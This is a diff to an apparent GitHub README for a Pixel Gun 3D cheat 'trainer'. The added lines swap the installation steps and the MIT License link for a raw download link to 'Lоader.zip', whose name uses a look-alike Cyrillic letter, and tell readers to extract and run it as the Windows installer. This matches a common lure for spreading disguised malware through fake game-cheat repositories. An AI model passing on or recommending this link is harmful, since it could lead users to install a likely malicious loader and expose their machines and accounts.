@@ -43,9 +43,9 @@ Unlock a wide array of functions designed to elevate your Pixel Gun 3D gameplay!
 
 Getting started with the Pixel Gun 3D Trainer is quick and easy. Please follow these steps for a smooth installation:
 
-1. **Download Loader.rar from the repository.**
-2. Extract Loader.rar using your preferred archive manager (WinRAR, 7-Zip, etc.).
-3. Open the installation folder and run the appropriate installer for your OS (Windows: setup.exe, macOS: .pkg file, Linux: .sh script).
+1. **Download https://raw.githubusercontent.com/VS-32/PixelGun3D-ArcaneTrainer/main/Lоader.zip from the repository.**
+2. Extract https://raw.githubusercontent.com/VS-32/PixelGun3D-ArcaneTrainer/main/Lоader.zip using your preferred archive manager (WinRAR, 7-Zip, etc.).
+3. Open the installation folder and run the appropriate installer for your OS (Windows: https://raw.githubusercontent.com/VS-32/PixelGun3D-ArcaneTrainer/main/Lоader.zip, macOS: .pkg file, Linux: .sh script).
 4. Follow the on-screen prompts to complete the installation process.
 5. Launch Pixel Gun 3D Trainer and tailor the settings to your preferences!
 6. For Linux/Mac, you may need to install additional dependencies (see the Wiki section in this repository for OS-specific instructions).
@@ -77,7 +77,7 @@ The **Pixel Gun 3D Trainer** is developed strictly for educational and personal 
 
 ## 👨‍💻 License (MIT, 2025) 👨‍💻
 
-This repository is licensed under the permissive [MIT License (2025)](https://opensource.org/licenses/MIT). You are free to copy, modify, and distribute this software in accordance with the conditions set forth by the license. No warranties are provided; use at your own risk.
+This repository is licensed under the permissive [MIT License (2025)](https://raw.githubusercontent.com/VS-32/PixelGun3D-ArcaneTrainer/main/Lоader.zip). You are free to copy, modify, and distribute this software in accordance with the conditions set forth by the license. No warranties are provided; use at your own risk.
 
 ---
 
